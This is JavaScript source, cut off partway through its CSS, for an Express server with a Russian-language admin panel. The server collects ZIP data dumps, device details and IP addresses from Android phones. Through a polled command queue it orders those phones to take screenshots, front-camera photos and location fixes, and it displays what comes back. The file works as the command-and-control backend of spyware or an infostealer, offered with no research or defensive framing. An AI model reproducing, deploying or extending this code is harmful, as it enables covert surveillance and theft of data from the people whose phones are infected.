const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: false, limit: '1mb' }));

// ── zero-dep gzip for text responses ────────────────────────────────────────
app.use((req, res, next) => {
  if (!/\bgzip\b/.test(String(req.headers['accept-encoding'] || ''))) return next();
  const end = res.end.bind(res);
  res.end = (chunk, enc, cb) => {
    try {
      if (typeof chunk === 'string') chunk = Buffer.from(chunk, enc || 'utf8');
      const ct = String(res.getHeader('content-type') || '');
      if (Buffer.isBuffer(chunk) && chunk.length > 1024 && /text|json|javascript|svg/.test(ct)) {
        const gz = zlib.gzipSync(chunk, { level: 6 });
        res.setHeader('Content-Encoding', 'gzip');
        res.setHeader('Content-Length', gz.length);
        res.removeHeader('ETag');
        return end(gz, cb);
      }
    } catch (e) {}
    return end(chunk, enc, cb);
  };
  next();
});

const PORT = process.env.PORT || 7860;

const UPLOAD_KEY = process.env.UPLOAD_KEY || 'change_me_upload';
const VIEW_KEY = process.env.VIEW_KEY || 'change_me_view';

const DATA_DIR = process.env.DATA_DIR || __dirname;
const SAVE_DIR = path.join(DATA_DIR, 'dumps');
const MEDIA_DIR = path.join(DATA_DIR, 'media');
const LOG_FILE = path.join(DATA_DIR, 'logs.json');
const UPLOAD_LOG_FILE = path.join(DATA_DIR, 'upload_logs.json');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
const CMDS_FILE = path.join(DATA_DIR, 'commands.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'panel.json');

if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
if (!fs.existsSync(MEDIA_DIR)) fs.mkdirSync(MEDIA_DIR, { recursive: true });
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '[]');
if (!fs.existsSync(UPLOAD_LOG_FILE)) fs.writeFileSync(UPLOAD_LOG_FILE, '[]');
if (!fs.existsSync(DEVICES_FILE)) fs.writeFileSync(DEVICES_FILE, '{}');
if (!fs.existsSync(CMDS_FILE)) fs.writeFileSync(CMDS_FILE, '{}');

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, SAVE_DIR),
  filename: (req, file, cb) => cb(null, `dump_${Date.now()}.zip`)
});
const upload = multer({ storage, limits: { fileSize: 1024 * 1024 * 1024 } });

const mediaStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, MEDIA_DIR),
  filename: (req, file, cb) => cb(null, `${Date.now()}_${(file.originalname || 'media').replace(/[^a-zA-Z0-9._-]/g, '_')}`)
});
const mediaUpload = multer({ storage: mediaStorage, limits: { fileSize: 200 * 1024 * 1024 } });

// ── json store + tiny in-process cache ─────────────────────────────────────
function readJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return def; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

const cache = new Map();
function cached(key, ttl, fn) {
  const hit = cache.get(key);
  const now = Date.now();
  if (hit && now - hit.t < ttl) return hit.v;
  const v = fn();
  cache.set(key, { v, t: now });
  return v;
}
function bust(...prefixes) {
  for (const k of Array.from(cache.keys())) {
    if (prefixes.some(p => k.startsWith(p))) cache.delete(k);
  }
}

function readLogs() { return cached('logs', 2000, () => readJSON(LOG_FILE, [])); }
function writeLogs(arr) {
  if (arr.length > 500) arr = arr.slice(-500);
  writeJSON(LOG_FILE, arr);
  bust('logs', 'stats');
}
function readUploadLogs() { return cached('uplogs', 2000, () => readJSON(UPLOAD_LOG_FILE, [])); }
function writeUploadLogs(arr) {
  if (arr.length > 2000) arr = arr.slice(-2000);
  writeJSON(UPLOAD_LOG_FILE, arr);
  bust('uplogs');
}
function readDevices() { return cached('devices', 2000, () => readJSON(DEVICES_FILE, {})); }
function writeDevices(o) { writeJSON(DEVICES_FILE, o); bust('devices'); }
function readCmds() { return readJSON(CMDS_FILE, {}); }
function writeCmds(o) { writeJSON(CMDS_FILE, o); }

const THEMES = [
  { id: 'mono',     name: 'Mono',     dot: '#ffffff' },
  { id: 'graphite', name: 'Graphite', dot: '#8f8f8f' },
  { id: 'paper',    name: 'Paper',    dot: '#f4f4f1' },
  { id: 'terminal', name: 'Terminal', dot: '#4ade80' },
  { id: 'amber',    name: 'Amber',    dot: '#f0b429' },
  { id: 'crimson',  name: 'Crimson',  dot: '#e8556b' }
];
const THEME_IDS = THEMES.map(t => t.id);

const DEFAULT_SETTINGS = {
  theme: 'mono',
  density: 'normal',   // normal | dense
  fontSize: 14,        // 13..16
  pageSize: 50,        // 25..200
  striped: false,
  hideIp: false,
  showThumbs: true,
  relativeTime: true,
  autoRefresh: 0       // seconds, 0 = off
};

function readSettings() {
  const s = readJSON(SETTINGS_FILE, {});
  const out = { ...DEFAULT_SETTINGS };
  if (THEME_IDS.includes(s.theme)) out.theme = s.theme;
  if (s.density === 'dense' || s.density === 'normal') out.density = s.density;
  if ([13, 14, 15, 16].includes(Number(s.fontSize))) out.fontSize = Number(s.fontSize);
  if ([25, 50, 100, 200].includes(Number(s.pageSize))) out.pageSize = Number(s.pageSize);
  if ([0, 10, 30, 60].includes(Number(s.autoRefresh))) out.autoRefresh = Number(s.autoRefresh);
  ['striped', 'hideIp', 'showThumbs', 'relativeTime'].forEach(k => {
    if (typeof s[k] === 'boolean') out[k] = s[k];
  });
  return out;
}
function writeSettings(s) { writeJSON(SETTINGS_FILE, s); bust('settings'); }

// ── formatting ─────────────────────────────────────────────────────────────
function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function fmtSize(bytes) {
  if (!bytes) return '0 B';
  const u = ['B', 'KB', 'MB', 'GB'];
  let i = 0, v = bytes;
  while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
  return v.toFixed(i === 0 ? 0 : 2) + ' ' + u[i];
}

function fmtTime(ts) {
  const d = new Date(ts);
  const p = n => String(n).padStart(2, '0');
  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`;
}

function ago(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return s + 's';
  if (s < 3600) return Math.floor(s / 60) + 'm';
  if (s < 86400) return Math.floor(s / 3600) + 'h';
  return Math.floor(s / 86400) + 'd';
}

function paginate(arr, page, per) {
  const total = arr.length;
  const pages = Math.max(1, Math.ceil(total / per));
  const p = Math.min(Math.max(1, Number(page) || 1), pages);
  const from = (p - 1) * per;
  return { slice: arr.slice(from, from + per), page: p, pages, total };
}

function pagerHtml(base, p) {
  if (p.pages <= 1) return '';
  const items = [];
  const win = 2;
  for (let n = 1; n <= p.pages; n++) {
    if (n === 1 || n === p.pages || Math.abs(n - p.page) <= win) {
      items.push(`<a class="pg ${n === p.page ? 'active' : ''}" href="${base}&page=${n}">${n}</a>`);
    } else if (items[items.length - 1] !== '<span class="pg dots">…</span>') {
      items.push('<span class="pg dots">…</span>');
    }
  }
  return `<div class="pager">${items.join('')}<span class="pg-info mono">${p.total} · ${p.page}/${p.pages}</span></div>`;
}

// ── api ────────────────────────────────────────────────────────────────────
app.post('/upload', upload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false, err: 'forbidden' });
  if (!req.file) return res.status(400).json({ ok: false, err: 'no file' });

  const meta = {
    device: req.headers['x-device'] || '?',
    android: req.headers['x-android'] || '?',
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    ts: Date.now(),
    filename: req.file.filename,
    size: req.file.size
  };
  fs.writeFileSync(path.join(SAVE_DIR, req.file.filename + '.json'), JSON.stringify(meta));
  bust('dumps', 'stats');
  res.json({ ok: true, id: req.file.filename });
});

app.post('/log', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const deviceId = data.deviceId || ip;

  const entry = {
    ts: Date.now(), ip,
    device: data.device || '?',
    android: data.android || '?',
    sdk: data.sdk || '?',
    clients: data.clients || [],
    zipSize: data.zipSize || 0,
    ok: data.ok === true,
    note: data.note || '',
    deviceId
  };

  const logs = readJSON(LOG_FILE, []);
  logs.push(entry);
  writeLogs(logs);

  const devices = readJSON(DEVICES_FILE, {});
  devices[deviceId] = {
    ...(devices[deviceId] || {}),
    deviceId,
    device: entry.device,
    android: entry.android,
    sdk: entry.sdk,
    clients: entry.clients,
    ip,
    lastSeen: Date.now()
  };
  writeDevices(devices);

  res.json({ ok: true, deviceId });
});

app.post('/log/upload', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const entry = {
    ts: Date.now(),
    ip,
    deviceId: data.deviceId || ip,
    device: data.device || '?',
    filename: data.filename || '?',
    stage: data.stage || '?',
    chunk: data.chunk || 0,
    totalChunks: data.totalChunks || 0,
    sentBytes: data.sentBytes || 0,
    totalBytes: data.totalBytes || 0,
    note: data.note || ''
  };

  const logs = readJSON(UPLOAD_LOG_FILE, []);
  logs.push(entry);
  writeUploadLogs(logs);

  res.json({ ok: true });
});

app.post('/cmd/poll', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = (req.body && req.body.deviceId) || req.query.deviceId || 'unknown';
  const cmds = readCmds();
  const queue = cmds[deviceId] || [];

  if (queue.length > 0) {
    const cmd = queue.shift();
    cmds[deviceId] = queue;
    writeCmds(cmds);
    return res.json({ ok: true, cmd });
  }

  res.json({ ok: true, cmd: null });
});

app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = req.headers['x-device-id'] || 'unknown';
  const cmdType = req.headers['x-cmd-type'] || '?';
  const status = req.headers['x-status'] || '?';

  let note = '';
  try {
    if (req.body && req.body.note) note = req.body.note;
  } catch (e) {}

  const entry = {
    ts: Date.now(),
    type: 'cmd_result',
    deviceId,
    cmd: cmdType,
    status,
    file: req.file ? '/media/' + req.file.filename : null,
    fileType: req.file ? (req.file.mimetype || '') : '',
    note
  };

  const logs = readJSON(LOG_FILE, []);
  logs.push(entry);
  writeLogs(logs);

  res.json({ ok: true });
});

app.get('/cmd/send', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const deviceId = req.query.device;
  const cmd = req.query.cmd;
  if (!deviceId || !cmd) return res.status(400).send('missing params');

  const cmds = readCmds();
  if (!cmds[deviceId]) cmds[deviceId] = [];
  cmds[deviceId].push({ cmd, ts: Date.now() });
  writeCmds(cmds);

  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control&device=' + encodeURIComponent(deviceId));
});

// quick theme switch from the sidebar
app.get('/theme/:id', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  if (THEME_IDS.includes(req.params.id)) {
    const s = readSettings();
    s.theme = req.params.id;
    writeSettings(s);
  }
  const to = typeof req.query.to === 'string' && req.query.to.startsWith('/') ? req.query.to : '/?key=' + encodeURIComponent(VIEW_KEY);
  res.redirect(to);
});

app.post('/settings', (req, res) => {
  const b = req.body || {};
  if (b.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const cur = readSettings();
  const next = { ...cur };

  if (THEME_IDS.includes(b.theme)) next.theme = b.theme;
  if (b.density === 'dense' || b.density === 'normal') next.density = b.density;
  if ([13, 14, 15, 16].includes(Number(b.fontSize))) next.fontSize = Number(b.fontSize);
  if ([25, 50, 100, 200].includes(Number(b.pageSize))) next.pageSize = Number(b.pageSize);
  if ([0, 10, 30, 60].includes(Number(b.autoRefresh))) next.autoRefresh = Number(b.autoRefresh);
  next.striped = b.striped === 'on';
  next.hideIp = b.hideIp === 'on';
  next.showThumbs = b.showThumbs === 'on';
  next.relativeTime = b.relativeTime === 'on';

  writeSettings(next);
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=settings&saved=1');
});

// ── panel ──────────────────────────────────────────────────────────────────
const NAV = [
  { id: 'dumps', label: 'Дампы' },
  { id: 'control', label: 'Управление' },
  { id: 'logs', label: 'Логи' },
  { id: 'uploadlog', label: 'Upload' },
  { id: 'settings', label: 'Настройки' }
];

app.get('/', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const S = readSettings();
  const tab = NAV.some(n => n.id === req.query.tab) ? req.query.tab : 'dumps';
  const selectedDevice = req.query.device || null;
  const page = Number(req.query.page) || 1;
  const k = encodeURIComponent(VIEW_KEY);

  const selfUrl = '/?key=' + k + '&tab=' + tab + (selectedDevice ? '&device=' + encodeURIComponent(selectedDevice) : '');

  const files = cached('dumps', 3000, () => fs.readdirSync(SAVE_DIR)
    .filter(f => f.endsWith('.zip'))
    .map(f => {
      const metaPath = path.join(SAVE_DIR, f + '.json');
      const stat = fs.statSync(path.join(SAVE_DIR, f));
      let meta = { device: '?', android: '?', ip: '?', ts: stat.mtimeMs };
      if (fs.existsSync(metaPath)) {
        try { meta = JSON.parse(fs.readFileSync(metaPath, 'utf8')); } catch (e) {}
      }
      return { filename: f, size: stat.size, ...meta };
    })
    .sort((a, b) => b.ts - a.ts));

  const logs = cached('logs', 2000, () => readJSON(LOG_FILE, []).slice().reverse());
  const uploadLogs = cached('uplogs', 2000, () => readJSON(UPLOAD_LOG_FILE, []).slice().reverse());
  const devices = readDevices();
  const deviceList = Object.values(devices).sort((a, b) => b.lastSeen - a.lastSeen);
  const onlineCount = deviceList.filter(d => (Date.now() - d.lastSeen) < 60000).length;
  const totalSize = files.reduce((s, f) => s + f.size, 0);
  const ipOf = ip => S.hideIp ? '•••' : esc(ip);

  const thumbs = l => (S.showThumbs && l.file && l.fileType && l.fileType.includes('image'))
    ? `<div class="thumb"><img loading="lazy" src="${esc(l.file)}" onclick="window.open('${esc(l.file)}','_blank')"/></div>`
    : '';

  // ── dumps ──
  const dumpsPage = paginate(files, page, S.pageSize);
  const dumpRows = dumpsPage.slice.map(f => `
    <tr>
      <td class="mono strong">${esc(f.device)}</td>
      <td class="dim">${esc(f.android)}</td>
      <td class="mono dim">${ipOf(f.ip)}</td>
      <td class="num">${fmtSize(f.size)}</td>
      <td class="mono dim">${fmtTime(f.ts)}${S.relativeTime ? ` <span class="faint">${ago(f.ts)}</span>` : ''}</td>
      <td class="right nowrap">
        <a class="btn" href="/download/${encodeURIComponent(f.filename)}?key=${k}">Скачать</a>
        <a class="btn danger" href="/delete/${encodeURIComponent(f.filename)}?key=${k}" onclick="return confirm('Удалить дамп?')">Удалить</a>
      </td>
    </tr>`).join('');

  // ── logs ──
  const logsPage = paginate(logs, page, S.pageSize);
  const logRows = logsPage.slice.map(l => {
    if (l.type === 'cmd_result') {
      return `
      <tr>
        <td class="mono dim">${fmtTime(l.ts)}</td>
        <td><span class="tag">cmd</span> ${esc(l.cmd)}</td>
        <td><span class="pill ${l.status === 'ok' ? 'on' : 'off'}">${esc(l.status)}</span></td>
        <td class="note">
          ${l.note ? esc(l.note) : '<span class="faint">—</span>'}
          ${thumbs(l)}
          ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<div><a class="btn mini" href="${esc(l.file)}" target="_blank">файл</a></div>` : ''}
        </td>
        <td class="mono dim right">${ipOf(l.ip)}</td>
      </tr>`;
    }
    return `
      <tr>
        <td class="mono dim">${fmtTime(l.ts)}</td>
        <td class="mono strong">${esc(l.device)}</td>
        <td class="dim">Android ${esc(l.android)} / ${esc(l.sdk)}</td>
        <td class="note">
          ${l.clients && l.clients.length ? `<span class="tag">${esc(l.clients.join(' · '))}</span>` : ''}
          ${l.zipSize ? `<span class="tag">${fmtSize(l.zipSize)}</span>` : ''}
          <span class="pill ${l.ok ? 'on' : 'off'}">${l.ok ? 'sent' : 'fail'}</span>
          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
        </td>
        <td class="mono dim right">${ipOf(l.ip)}</td>
      </tr>`;
  }).join('');

  // ── upload log ──
  const uplPage = paginate(uploadLogs, page, S.pageSize);
  const uploadRows = uplPage.slice.map(l => {
    const pct = l.totalBytes > 0 ? Math.min(100, (l.sentBytes / l.totalBytes) * 100) : 0;
    return `
      <tr>
        <td class="mono dim">${fmtTime(l.ts)}</td>
        <td class="mono strong">${esc(l.device)}</td>
        <td class="mono dim">${esc(l.filename)}</td>
        <td>
          <span class="pill ${l.stage === 'done' ? 'on' : l.stage === 'fail' ? 'off' : ''}">${esc(l.stage)}</span>
          ${l.totalChunks ? `<span class="tag">chunk ${l.chunk}/${l.totalChunks}</span>` : ''}
          ${l.totalBytes ? `<div class="bar"><i style="width:${pct.toFixed(1)}%"></i></div><div class="sub mono">${fmtSize(l.sentBytes)} / ${fmtSize(l.totalBytes)} · ${pct.toFixed(1)}%</div>` : ''}
          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
        </td>
        <td class="mono dim right">${ipOf(l.ip)}</td>
      </tr>`;
  }).join('');

  // ── control ──
  let controlHtml = '';
  if (!selectedDevice) {
    controlHtml = deviceList.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Устройств пока нет</div></div>`
      : `<div class="grid">` + deviceList.map(d => {
          const online = (Date.now() - d.lastSeen) < 60000;
          return `
          <a class="card" href="/?key=${k}&tab=control&device=${encodeURIComponent(d.deviceId)}">
            <div class="card-top">
              <span class="dot ${online ? 'on' : ''}"></span>
              <span class="card-title">${esc(d.device)}</span>
              <span class="card-ago mono">${S.relativeTime ? ago(d.lastSeen) : fmtTime(d.lastSeen)}</span>
            </div>
            <div class="kv"><span>ID</span><b class="mono">${esc(d.deviceId)}</b></div>
            <div class="kv"><span>Android</span><b>${esc(d.android)} / ${esc(d.sdk)}</b></div>
            <div class="kv"><span>IP</span><b class="mono">${ipOf(d.ip)}</b></div>
            <div class="kv"><span>Клиенты</span><b>${esc((d.clients || []).join(', ') || '—')}</b></div>
          </a>`;
        }).join('') + `</div>`;
  } else {
    const dev = devices[selectedDevice];
    if (!dev) {
      controlHtml = `<div class="empty"><div class="empty-mark">?</div><div>Устройство не найдено</div></div>`;
    } else {
      const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result');
      const dl = paginate(devLogs, page, S.pageSize);
      const q = `key=${k}&device=${encodeURIComponent(selectedDevice)}`;
      const online = (Date.now() - dev.lastSeen) < 60000;
      controlHtml = `
        <a class="back" href="/?key=${k}&tab=control">← Все устройства</a>
        <div class="dev-head">
          <div>
            <div class="dev-name">${esc(dev.device)}</div>
            <div class="dev-sub mono">${ipOf(dev.ip)} · Android ${esc(dev.android)} · ${esc(dev.deviceId)}</div>
          </div>
          <span class="pill ${online ? 'on' : 'off'}">${online ? 'online' : 'seen ' + ago(dev.lastSeen) + ' ago'}</span>
        </div>
        <div class="cmd-grid">
          <a class="cmd" href="/cmd/send?${q}&cmd=screenshot"><span>01</span>Скриншот</a>
          <a class="cmd" href="/cmd/send?${q}&cmd=frontcam"><span>02</span>Фронталка</a>
          <a class="cmd" href="/cmd/send?${q}&cmd=location"><span>03</span>Гео</a>
        </div>
        <div class="section-title">Результаты <span class="faint">${devLogs.length}</span></div>
        ${devLogs.length === 0 ? `<div class="empty small">Пока ничего</div>` : `
        <div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead>
          <tbody>${dl.slice.map(l => `
            <tr>
              <td class="mono dim">${fmtTime(l.ts)}</td>
              <td class="mono strong">${esc(l.cmd)}</td>
              <td><span class="pill ${l.status === 'ok' ? 'on' : 'off'}">${esc(l.status)}</span></td>
              <td class="note">
                ${thumbs(l)}
                ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<a class="btn mini" href="${esc(l.file)}" target="_blank">открыть</a>` : ''}
                ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
              </td>
            </tr>`).join('')}
          </tbody>
        </table></div>
        ${pagerHtml('/?key=' + k + '&tab=control&device=' + encodeURIComponent(selectedDevice), dl)}`}`;
    }
  }

  // ── settings ──
  let settingsHtml = '';
  if (tab === 'settings') {
    const themeCards = THEMES.map(t => `
      <label class="theme-card ${S.theme === t.id ? 'active' : ''}">
        <input type="radio" name="theme" value="${t.id}" ${S.theme === t.id ? 'checked' : ''}/>
        <span class="swatches">
          <i style="background:${t.dot}"></i>
          <i style="background:${t.dot};opacity:.55"></i>
          <i style="background:${t.dot};opacity:.3"></i>
        </span>
        <span class="theme-name">${t.name}</span>
      </label>`).join('');

    const seg = (name, value, opts) => `
      <div class="seg">
        ${opts.map(o => `<label class="seg-item ${String(value) === String(o.v) ? 'active' : ''}">
          <input type="radio" name="${name}" value="${o.v}" ${String(value) === String(o.v) ? 'checked' : ''}/>${o.l}
        </label>`).join('')}
      </div>`;

    const toggle = (name, label, sub, checked) => `
      <label class="row-toggle">
        <span class="row-text"><b>${label}</b><small>${sub}</small></span>
        <input type="checkbox" name="${name}" ${checked ? 'checked' : ''}/>
        <span class="switch"></span>
      </label>`;

    settingsHtml = `
      ${req.query.saved ? `<div class="toast">Настройки сохранены</div>` : ''}
      <form method="post" action="/settings" class="settings">
        <input type="hidden" name="key" value="${esc(VIEW_KEY)}"/>

        <div class="section-title">Тема</div>
        <div class="theme-grid">${themeCards}</div>

        <div class="section-title">Интерфейс</div>
        <div class="set-card">
          <div class="set-row">
            <span class="row-text"><b>Плотность</b><small>высота строк и отступы</small></span>
            ${seg('density', S.density, [{ v: 'normal', l: 'Обычная' }, { v: 'dense', l: 'Компактная' }])}
          </div>
          <div class="set-row">
            <span class="row-text"><b>Размер шрифта</b><small>базовый кегль панели</small></span>
            ${seg('fontSize', S.fontSize, [{ v: 13, l: '13' }, { v: 14, l: '14' }, { v: 15, l: '15' }, { v: 16, l: '16' }])}
          </div>
          <div class="set-row">
            <span class="row-text"><b>Строк на страницу</b><small>для таблиц и логов</small></span>
            ${seg('pageSize', S.pageSize, [{ v: 25, l: '25' }, { v: 50, l: '50' }, { v: 100, l: '100' }, { v: 200, l: '200' }])}
          </div>
          <div class="set-row">
            <span class="row-text"><b>Автообновление</b><small>перезагрузка страницы по таймеру</small></span>
            ${seg('autoRefresh', S.autoRefresh, [{ v: 0, l: 'Выкл' }, { v: 10, l: '10с' }, { v: 30, l: '30с' }, { v: 60, l: '60с' }])}
          </div>
        </div>

        <div class="section-title">Отображение</div>
        <div class="set-card">
          ${toggle('striped', 'Полосатые строки', 'чередование фона в таблицах', S.striped)}
          ${toggle('hideIp', 'Скрывать IP', 'маскировать адреса в списках', S.hideIp)}
          ${toggle('showThumbs', 'Превью изображений', 'показывать скриншоты в логах', S.showThumbs)}
          ${toggle('relativeTime', 'Относительное время', 'добавлять «12m», «3h» рядом с датой', S.relativeTime)}
        </div>

        <div class="set-actions">
          <button class="btn primary" type="submit">Сохранить</button>
          <a class="btn" href="${selfUrl}">Сбросить</a>
          <span class="faint mono">panel.json · ${esc(VIEW_KEY.slice(0, 4))}••••</span>
        </div>
      </form>`;
  }

  const counts = {
    dumps: files.length,
    control: deviceList.length,
    logs: logs.length,
    uploadlog: uploadLogs.length,
    settings: null
  };

  const navHtml = NAV.map(n => `
    <a class="nav ${tab === n.id ? 'active' : ''}" href="/?key=${k}&tab=${n.id}">
      <span>${n.label}</span>${n.id === 'settings' ? '<span class="nav-count mono">⚙</span>' : `<span class="nav-count mono">${counts[n.id]}</span>`}
    </a>`).join('');

  const themesDots = THEMES.map(t => `
    <a class="tdot ${S.theme === t.id ? 'active' : ''}" title="${t.name}" style="--d:${t.dot}"
       href="/theme/${t.id}?key=${k}&to=${encodeURIComponent(selfUrl)}"></a>`).join('');

  const titles = { dumps: 'Дампы', control: 'Управление', logs: 'Логи', uploadlog: 'Upload Log', settings: 'Настройки' };
  const clearLink =
    tab === 'dumps' ? `<a class="btn danger" href="/clear?key=${k}" onclick="return confirm('Удалить ВСЕ дампы?')">Очистить всё</a>` :
    tab === 'logs' ? `<a class="btn danger" href="/clearlogs?key=${k}" onclick="return confirm('Удалить все логи?')">Очистить всё</a>` :
    tab === 'uploadlog' ? `<a class="btn danger" href="/clearuploadlogs?key=${k}" onclick="return confirm('Удалить upload-логи?')">Очистить всё</a>` : '';

  const searchable = tab === 'dumps' || tab === 'logs' || tab === 'uploadlog' || (tab === 'control' && selectedDevice);
  const toolbar = (searchable || clearLink) ? `
    <div class="toolbar">
      ${searchable ? `<input class="search" data-search placeholder="Поиск по таблице…" autocomplete="off"/>` : ''}
      <div class="spacer"></div>
      ${clearLink}
    </div>` : '';

  let body = '';
  if (tab === 'settings') {
    body = settingsHtml;
  } else if (tab === 'uploadlog') {
    body = uploadLogs.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Upload-логов пока нет</div></div>`
      : `${toolbar}<div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Устройство</th><th>Файл</th><th>Статус</th><th class="right">IP</th></tr></thead>
          <tbody>${uploadRows}</tbody>
        </table></div>${pagerHtml(selfUrl, uplPage)}`;
  } else if (tab === 'logs') {
    body = logs.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Логов пока нет</div></div>`
      : `${toolbar}<div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Устройство</th><th>Система</th><th>Детали</th><th class="right">IP</th></tr></thead>
          <tbody>${logRows}</tbody>
        </table></div>${pagerHtml(selfUrl, logsPage)}`;
  } else if (tab === 'control') {
    body = controlHtml;
  } else {
    body = files.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Дампов пока нет</div></div>`
      : `${toolbar}<div class="table-wrap"><table>
          <thead><tr><th>Устройство</th><th>Android</th><th>IP</th><th>Размер</th><th>Время</th><th class="right"></th></tr></thead>
          <tbody>${dumpRows}</tbody>
        </table></div>${pagerHtml(selfUrl, dumpsPage)}`;
  }

  const bodyClass = [
    't-' + S.theme,
    S.density === 'dense' ? 'dense' : '',
    S.striped ? 'striped' : ''
  ].filter(Boolean).join(' ');

  const html = `<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel — ${titles[tab] || ''}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html{-webkit-text-size-adjust:100%}
body{
  background:var(--bg);color:var(--fg);
  font:var(--fs)/1.55 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,system-ui,sans-serif;
  -webkit-font-smoothing:antialiased;min-height:100vh;
}
body::before{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background:radial-gradient(1200px 600px at 20% -10%,var(--wash),transparent 70%);
}
.mono{font-family:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,monospace;font-size:calc(var(--fs) - 1.5px)}
.dim{color:var(--fg-2)}
.faint{color:var(--fg-3)}
.strong{color:var(--fg);font-weight:600}
.num{font-variant-numeric:tabular-nums}
.nowrap{white-space:nowrap}
a{color:inherit;text-decoration:none}
::selection{background:var(--accent);color:var(--accent-fg)}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-thumb{background:var(--line-2);border-radius:99px;border:3px solid var(--bg)}
::-webkit-scrollbar-track{background:transparent}

.shell{display:flex;min-height:100vh;position:relative;z-index:1}

/* sidebar */
.sidebar{
  width:236px;flex-shrink:0;border-right:1px solid var(--line);
  background:var(--bg-2);display:flex;flex-direction:column;
  position:sticky;top:0;height:100vh;
}
.brand{display:flex;align-items:center;gap:10px;padding:22px 20px 20px;border-bottom:1px solid var(--line)}
.mark{width:26px;height:26px;display:grid;place-items:center;border:1px solid var(--line-2);border-radius:7px;font-size:12px;color:var(--strong)}
.brand-name{font-weight:700;letter-spacing:.18em;font-size:11.5px;color:var(--strong)}
.brand-tag{margin-left:auto;font-size:9.5px;letter-spacing:.1em;color:var(--fg-3);border:1px solid var(--line);border-radius:4px;padding:2px 5px}
.nav-wrap{padding:14px 12px;display:flex;flex-direction:column;gap:2px}
.nav{
  display:flex;align-items:center;justify-content:space-between;
  padding:9px 12px;border-radius:7px;color:var(--fg-2);
  font-size:13px;font-weight:500;transition:background .14s,color .14s,padding .14s;
}
.nav:hover{background:var(--hover);color:var(--fg)}
.nav.active{background:var(--accent);color:var(--accent-fg);font-weight:600}
.nav.active .nav-count{color:var(--accent-fg);border-color:color-mix(in srgb,var(--accent-fg) 30%,transparent)}
.nav-count{font-size:11px;padding:1px 7px;border:1px solid var(--line);border-radius:99px;color:var(--fg-3);font-variant-numeric:tabular-nums}
.side-foot{margin-top:auto;padding:14px 20px 18px;border-top:1px solid var(--line)}
.foot-line{font-size:11px;color:var(--fg-3);letter-spacing:.04em;margin-bottom:12px}
.foot-line b{color:var(--fg-2);font-weight:600}
.tdots{display:flex;gap:8px;align-items:center}
.tdot{width:15px;height:15px;border-radius:50%;background:var(--d);opacity:.55;transition:transform .15s,opacity .15s,box-shadow .15s;border:1px solid rgba(0,0,0,.25)}
.tdot:hover{opacity:1;transform:scale(1.15)}
.tdot.active{opacity:1;box-shadow:0 0 0 2px var(--bg-2),0 0 0 3px var(--fg-2)}

/* main */
.main{flex:1;min-width:0;display:flex;flex-direction:column}
.topbar{
